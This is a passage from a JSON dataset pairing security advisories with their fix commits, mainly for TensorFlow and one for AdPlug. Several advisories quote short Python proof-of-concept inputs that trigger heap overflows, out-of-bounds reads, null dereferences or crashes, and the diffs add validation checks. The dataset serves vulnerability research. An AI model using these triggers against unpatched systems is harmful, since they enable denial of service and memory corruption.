      "commit_datetime": "04/28/2021, 00:46:10",
      "message": "Handle one more division by 0 in TFLite.\n\nPiperOrigin-RevId: 370800140\nChange-Id: I9ab42e5aaccf02f226d1282611490a54cf7d273e",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'tensorflow/lite/kernels/gather_nd.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d/tensorflow%2Flite%2Fkernels%2Fgather_nd.cc', 'patch': '@@ -155,6 +155,9 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_OK(context,\\n                     GetOutputSafe(context, node, kOutputTensor, &output));\\n \\n+  // Prevent division by 0 in the helper\\n+  TF_LITE_ENSURE(context, NumElements(params) > 0);\\n+\\n   switch (indices->type) {\\n     case kTfLiteInt32:\\n       return EvalGatherNd<int32_t>(context, params, indices, output);'}}",
      "message_norm": "handle one more division by 0 in tflite.\n\npiperorigin-revid: 370800140\nchange-id: i9ab42e5aaccf02f226d1282611490a54cf7d273e",
      "language": "en",
      "entities": "[('division by 0', 'SECWORD', ''), ('370800140', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/lite/kernels/gather_nd.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1761,
      "vuln_id": "GHSA-fq6p-6334-8gr4",
      "cwe_id": "{'CWE-401'}",
      "score": 4.3,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9'}",
      "dataset": "osv",
      "summary": "Memory leak in decoding PNG images ### Impact\nWhen [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L322-L416) TensorFlow can produce a memory leak if the image is invalid.\nAfter calling `png::CommonInitDecode(..., &decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(&decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur.\n  \n### Patches   \nWe have patched the issue in GitHub commit [ab51e5b813573dc9f51efa335aebcf2994125ee9](https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
      "published_date": "2022-02-09",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9",
      "commit_sha": "ab51e5b813573dc9f51efa335aebcf2994125ee9",
      "patch": "SINGLE",
      "chain_ord": "['ab51e5b813573dc9f51efa335aebcf2994125ee9']",
      "before_first_fix_commit": "{'fb5ce99505358985ace9e811fd25a57047471d6f'}",
      "last_fix_commit": "ab51e5b813573dc9f51efa335aebcf2994125ee9",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/12/2021, 03:24:32",
      "message": "Prevent memory leak in decoding PNG images.\n\nPiperOrigin-RevId: 409300653\nChange-Id: I6182124c545989cef80cefd439b659095920763b",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 12, 'deletions': 0, 'total': 12}",
      "files": "{'tensorflow/core/kernels/image/decode_image_op.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/ab51e5b813573dc9f51efa335aebcf2994125ee9/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdecode_image_op.cc', 'patch': '@@ -18,6 +18,8 @@ limitations under the License.\\n #include <cstdint>\\n #include <memory>\\n \\n+#include \"tensorflow/core/lib/gtl/cleanup.h\"\\n+\\n #define EIGEN_USE_THREADS\\n \\n #include \"absl/strings/escaping.h\"\\n@@ -326,6 +328,16 @@ class DecodeImageV2Op : public OpKernel {\\n         context, png::CommonInitDecode(input, channels_, channel_bits, &decode),\\n         errors::InvalidArgument(\"Invalid PNG. Failed to initialize decoder.\"));\\n \\n+    // If we reach this point, then there is data in `decode` which must be\\n+    // freed by the time we end execution in this function. We cannot call\\n+    // `png::CommonFreeDecode()` before an `OP_REQUIRES` because if\\n+    // `OP_REQUIRES` constraint is satisfied then the data would be freed\\n+    // prematurely. Instead, let\\'s use a `Cleanup` object.\\n+    auto cleanup = gtl::MakeCleanup([&decode]() {\\n+      std::cerr << \"Cleanup called...\\\\n\";\\n+      png::CommonFreeDecode(&decode);\\n+    });\\n+\\n     // Verify that width and height are not too large:\\n     // - verify width and height don\\'t overflow int.\\n     // - width can later be multiplied by channels_ and sizeof(uint16), so'}}",
      "message_norm": "prevent memory leak in decoding png images.\n\npiperorigin-revid: 409300653\nchange-id: i6182124c545989cef80cefd439b659095920763b",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('memory leak', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('409300653', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/image/decode_image_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3264,
      "vuln_id": "GHSA-wcv5-qrj6-9pfm",
      "cwe_id": "{'CWE-787', 'CWE-120'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197'}",
      "dataset": "osv",
      "summary": "Heap buffer overflow in `Conv3DBackprop*` ### Impact\nMissing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)\nout_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_values = [-10.0] * (7 * 7 * 7 * 7 * 7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.\n\n### Patches\nWe have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197",
      "commit_sha": "8f37b52e1320d8d72a9529b2468277791a261197",
      "patch": "SINGLE",
      "chain_ord": "['8f37b52e1320d8d72a9529b2468277791a261197']",
      "before_first_fix_commit": "{'4814fafb0ca6b5ab58a09411523b2193fed23fed'}",
      "last_fix_commit": "8f37b52e1320d8d72a9529b2468277791a261197",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/19/2021, 20:46:32",
      "message": "Validate some shape requirements for `Conv3DBackpropFilter*` and `Conv3DBackpropInput*` ops.\n\nOlder versions of Eigen might otherwise crash / produce OOB read on specially crafted inputs.\n\nPiperOrigin-RevId: 369293977\nChange-Id: I58f51445a93936d7cf8e616f75de17677df36718",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 56, 'deletions': 0, 'total': 56}",
      "files": "{'tensorflow/core/kernels/conv_grad_ops_3d.cc': {'additions': 56, 'deletions': 0, 'changes': 56, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/8f37b52e1320d8d72a9529b2468277791a261197/tensorflow%2Fcore%2Fkernels%2Fconv_grad_ops_3d.cc', 'patch': '@@ -239,6 +239,20 @@ class Conv3DBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context, ConvBackpropComputeDimensions(\\n                                 \"Conv3DBackpropInputOp\", /*num_spatial_dims=*/3,\\n@@ -346,6 +360,20 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context, ConvBackpropComputeDimensions(\\n                                 \"Conv3DBackpropInputOp\", /*num_spatial_dims=*/3,\\n@@ -696,6 +724,20 @@ class Conv3DBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context,\\n                    ConvBackpropComputeDimensions(\\n@@ -808,6 +850,20 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(\\n+        context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n+        errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n+                                \"number of channels. Got \",\\n+                                input_shape.dim_size(4), \" for input and \",\\n+                                filter_shape.dim_size(3), \" for filter_sizes\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dim_size(4) == filter_shape.dim_size(4),\\n+        errors::InvalidArgument(\"out_backprop and filter_sizes must have the \"\\n+                                \"same number of channels. Got \",\\n+                                out_backprop_shape.dim_size(4),\\n+                                \" for out_backprop and \",\\n+                                filter_shape.dim_size(4), \" for filter_sizes\"));\\n+\\n     ConvBackpropDimensions dims;\\n     OP_REQUIRES_OK(context,\\n                    ConvBackpropComputeDimensions('}}",
      "message_norm": "validate some shape requirements for `conv3dbackpropfilter*` and `conv3dbackpropinput*` ops.\n\nolder versions of eigen might otherwise crash / produce oob read on specially crafted inputs.\n\npiperorigin-revid: 369293977\nchange-id: i58f51445a93936d7cf8e616f75de17677df36718",
      "language": "en",
      "entities": "[('validate', 'ACTION', ''), ('oob', 'SECWORD', ''), ('369293977', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/conv_grad_ops_3d.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1159,
      "vuln_id": "GHSA-874w-m2v2-mj64",
      "cwe_id": "{'CWE-415'}",
      "score": 9.8,
      "chain": "{'https://github.com/adplug/adplug/commit/1a282a486a8e33fef3e15998bf6408d3515dc07e', 'https://github.com/miller-alex/adplug/commit/8abb9328bf27dcbdafc67ade3e75af0ffd8f7633'}",
      "dataset": "osv",
      "summary": "Double Free in Adplug AdPlug 2.3.1 has a double free in the Cu6mPlayer class in u6m.h.",
      "published_date": "2021-03-29",
      "chain_len": 2,
      "project": "https://github.com/adplug/adplug",
      "commit_href": "https://github.com/adplug/adplug/commit/1a282a486a8e33fef3e15998bf6408d3515dc07e",
      "commit_sha": "1a282a486a8e33fef3e15998bf6408d3515dc07e",
      "patch": "MULTI",
      "chain_ord": "['8abb9328bf27dcbdafc67ade3e75af0ffd8f7633', '1a282a486a8e33fef3e15998bf6408d3515dc07e']",
      "before_first_fix_commit": "{'a8903d884e2c900e77af5c70ef440e72626646ad'}",
      "last_fix_commit": "1a282a486a8e33fef3e15998bf6408d3515dc07e",
      "chain_ord_pos": 2.0,
      "commit_datetime": "05/11/2020, 11:48:45",
      "message": "Update NEWS with a list of CVEs now fixed",
      "author": "Adam Nielsen",
      "comments": null,
      "stats": "{'additions': 10, 'deletions': 0, 'total': 10}",
      "files": "{'NEWS': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https://github.com/adplug/adplug/raw/1a282a486a8e33fef3e15998bf6408d3515dc07e/NEWS', 'patch': '@@ -2,6 +2,16 @@ This is a brief overview of user-visible changes in AdPlug.\\n \\n Changes for version 2.3.3:\\n --------------------------\\n+- Bug fixes: (huge thanks to Alexander Miller for these)\\n+  - CVE-2019-14690 - buffer overflow in .bmf\\n+  - CVE-2019-14691 - buffer overflow in .dtm\\n+  - CVE-2019-14692 - buffer overflow in .mkj\\n+  - CVE-2019-14732 - buffer overflow in .a2m\\n+  - CVE-2019-14733 - buffer overflow in .rad\\n+  - CVE-2019-14734 - buffer overflow in .mtk\\n+  - CVE-2019-15151 - double free and OOB reads in .u6m\\n+  - OOB reads in .xad\\n+  - OOB reads in .rix\\n \\n Changes for version 2.3.2:\\n --------------------------'}}",
      "message_norm": "update news with a list of cves now fixed",
      "language": "en",
      "entities": "[('update', 'ACTION', ''), ('fixed', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['NEWS'])",
      "num_files": 1.0
    },
    {
      "index": 2944,
      "vuln_id": "GHSA-rgvq-pcvf-hx75",
      "cwe_id": "{'CWE-131'}",
      "score": 5.3,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a', 'https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6', 'https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e'}",
      "dataset": "osv",
      "summary": "Heap OOB and null pointer dereference in `RaggedTensorToTensor` ### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 3,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a",
      "commit_sha": "f94ef358bb3e91d517446454edff6535bcfe8e4a",
      "patch": "MULTI",
      "chain_ord": "['f94ef358bb3e91d517446454edff6535bcfe8e4a', 'b761c9b652af2107cfbc33efd19be0ce41daa33e', 'c4d7afb6a5986b04505aca4466ae1951686c80f6']",
      "before_first_fix_commit": "{'50034ad2d55b10eb9d4593374546710b12f134e1'}",
      "last_fix_commit": "c4d7afb6a5986b04505aca4466ae1951686c80f6",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/13/2021, 21:54:18",
      "message": "Fix `tf.raw_ops.RaggedTensorToTensor` failing CHECK in `tensor.cc`.\n\nPiperOrigin-RevId: 368300502\nChange-Id: I91255d23c4bfd3aa3c029aac773937c09daf3c64",
      "author": "Amit Patankar",
      "comments": null,
      "stats": "{'additions': 5, 'deletions': 0, 'total': 5}",
      "files": "{'tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/f94ef358bb3e91d517446454edff6535bcfe8e4a/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -345,6 +345,11 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* context) override {\\n     INDEX_TYPE first_dimension;\\n+    const Tensor first_partition_tensor =\\n+        context->input(kFirstPartitionInputIndex);\\n+    OP_REQUIRES(context, first_partition_tensor.NumElements() > 0,\\n+                errors::InvalidArgument(\"Invalid first partition input. Tensor \"\\n+                                        \"requires at least one element.\"));\\n     OP_REQUIRES_OK(context, GetFirstDimensionSize(context, &first_dimension));\\n     vector<INDEX_TYPE> output_size;\\n     OP_REQUIRES_OK(context,'}}",
      "message_norm": "fix `tf.raw_ops.raggedtensortotensor` failing check in `tensor.cc`.\n\npiperorigin-revid: 368300502\nchange-id: i91255d23c4bfd3aa3c029aac773937c09daf3c64",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('368300502', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1966,
      "vuln_id": "GHSA-h2wq-prv9-2f56",
      "cwe_id": "{'CWE-20'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58'}",
      "dataset": "osv",
      "summary": "Missing validation crashes `QuantizeAndDequantizeV4Grad` ### Impact\nThe implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  axis=-1)\n```\n\nThe code assumes `input_min` and `input_max` are scalars but there is no validation for this.\n\n### Patches\nWe have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
      "published_date": "2022-05-24",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58",
      "commit_sha": "098e7762d909bac47ce1dbabe6dfd06294cb9d58",
      "patch": "SINGLE",
      "chain_ord": "['098e7762d909bac47ce1dbabe6dfd06294cb9d58']",
      "before_first_fix_commit": "{'e505acc64062d9250ad4452ce57529bed8fd2160'}",
      "last_fix_commit": "098e7762d909bac47ce1dbabe6dfd06294cb9d58",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/28/2022, 18:06:02",
      "message": "Fix tf.raw_ops.QuantizeAndDequantizeV4Grad vulnerability with invalid input_min or input_max.\n\nCheck that argument is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445198280",
      "author": "Alan Liu",
      "comments": null,
      "stats": "{'additions': 8, 'deletions': 2, 'total': 10}",
      "files": "{'tensorflow/core/kernels/quantize_and_dequantize_op.cc': {'additions': 8, 'deletions': 2, 'changes': 10, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/098e7762d909bac47ce1dbabe6dfd06294cb9d58/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -174,13 +174,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n     OP_REQUIRES(ctx,\\n                 input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input min tensor must have dimension 1. Recieved \",\\n+                    \"Input min tensor must have dimension 0 or 1. Received \",\\n                     input_min_tensor.dims(), \".\"));\\n     const Tensor& input_max_tensor = ctx->input(3);\\n     OP_REQUIRES(ctx,\\n                 input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input max tensor must have dimension 1. Recieved \",\\n+                    \"Input max tensor must have dimension 0 or 1. Received \",\\n                     input_max_tensor.dims(), \".\"));\\n     if (axis_ != -1) {\\n       OP_REQUIRES(\\n@@ -203,6 +203,12 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n                    ctx->allocate_output(2, min_max_shape, &input_max_backprop));\\n \\n     if (axis_ == -1) {\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_min_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_min must be a scalar if axis is unspecified\"));\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_max_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_max must be a scalar if axis is unspecified\"));\\n       functor::QuantizeAndDequantizeOneScaleGradientFunctor<Device, T> f;\\n       f(ctx->eigen_device<Device>(), gradient.template flat<T>(),\\n         input.template flat<T>(), input_min_tensor.scalar<T>(),'}}",
      "message_norm": "fix tf.raw_ops.quantizeanddequantizev4grad vulnerability with invalid input_min or input_max.\n\ncheck that argument is actually a scalar before treating it as such.\n\npiperorigin-revid: 445198280",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('445198280', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/quantize_and_dequantize_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 452,
      "vuln_id": "GHSA-4p4p-www8-8fv9",
      "cwe_id": "{'CWE-824'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8'}",
      "dataset": "osv",
      "summary": "Reference binding to null in `ParameterizedTruncatedNormal` ### Impact\nAn attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`:\n\n```python\nimport tensorflow as tf\n    \nshape = tf.constant([], shape=[0], dtype=tf.int32)\nmeans = tf.constant((1), dtype=tf.float32)\nstdevs = tf.constant((1), dtype=tf.float32)\nminvals = tf.constant((1), dtype=tf.float32)\nmaxvals = tf.constant((1), dtype=tf.float32)\n  \ntf.raw_ops.ParameterizedTruncatedNormal(\n  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3f6fe4dfef6f57e768260b48166c27d148f3015f/tensorflow/core/kernels/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`:\n\n```cc\nint32 num_batches = shape_tensor.flat<int32>()(0);\n``` \n\nIf `shape` argument is empty, then `shape_tensor.flat<T>()` is an empty array.\n\n### Patches\nWe have patched the issue in GitHub commit [5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8](https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8",
      "commit_sha": "5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8",
      "patch": "SINGLE",
      "chain_ord": "['5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8']",
      "before_first_fix_commit": "{'3f6fe4dfef6f57e768260b48166c27d148f3015f'}",
      "last_fix_commit": "5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/05/2021, 02:14:24",
      "message": "Fix breakage in parameterized_truncated_normal_op.cc\n\nPiperOrigin-RevId: 372041718\nChange-Id: Iff79e77a2bb27032423eefcb84211627b27dfe81",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
